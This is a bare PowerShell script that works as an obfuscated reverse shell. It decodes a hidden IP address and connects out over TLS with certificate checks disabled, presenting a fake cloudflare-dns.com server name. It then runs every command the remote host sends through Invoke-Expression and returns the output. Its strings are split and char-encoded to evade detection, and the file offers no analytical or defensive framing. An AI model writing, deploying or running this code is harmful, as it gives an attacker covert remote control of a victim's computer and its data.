$Active = 1; 


if ($Active -ne 1) { exit }


try {
    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
    
    
    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('M'+'TQ'+'2'+'Lj'+'cwLjI'+'0M'+'C4yMDU=')));
    $port = 40398;

    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
    $NetworkStream = $TCPClient.GetStream();
    
    
    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
    $SslStream.AuthenticateAsClient("$([char]0x63)$([char]0x6C)$([char]0x6F)$([char]0x75)$([char]0x64)$([char]0x66)$([char]0x6C)$([char]0x61)$([char]0x72)$([char]0x65)$([char]0x2D)$([char]0x64)$([char]0x6E)$([char]0x73)$([char]0x2E)$([char]0x63)$([char]0x6F)$([char]0x6D)", $null, $sslProtocols, $false);

    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
        $SslStream.Close();
        exit;
    }

    $StreamWriter = New-Object IO.StreamWriter($SslStream);
    $StreamWriter.AutoFlush = $true;

    # Function to format the shell prompt
    function WriteToStream ($String) {
        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
        $StreamWriter.Write($String + ('PS'+' ') + (gl).Path + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PiA='))));
    };

    WriteToStream '';

    
    while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
        
        if ($Command -eq "$([char]0x65)$([char]0x78)$([char]0x69)$([char]0x74)") { break }
        
        $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
        
        WriteToStream ($Output);
    }

    $StreamWriter.Close();
    $TCPClient.Close();
} catch {
    
    exit;
}
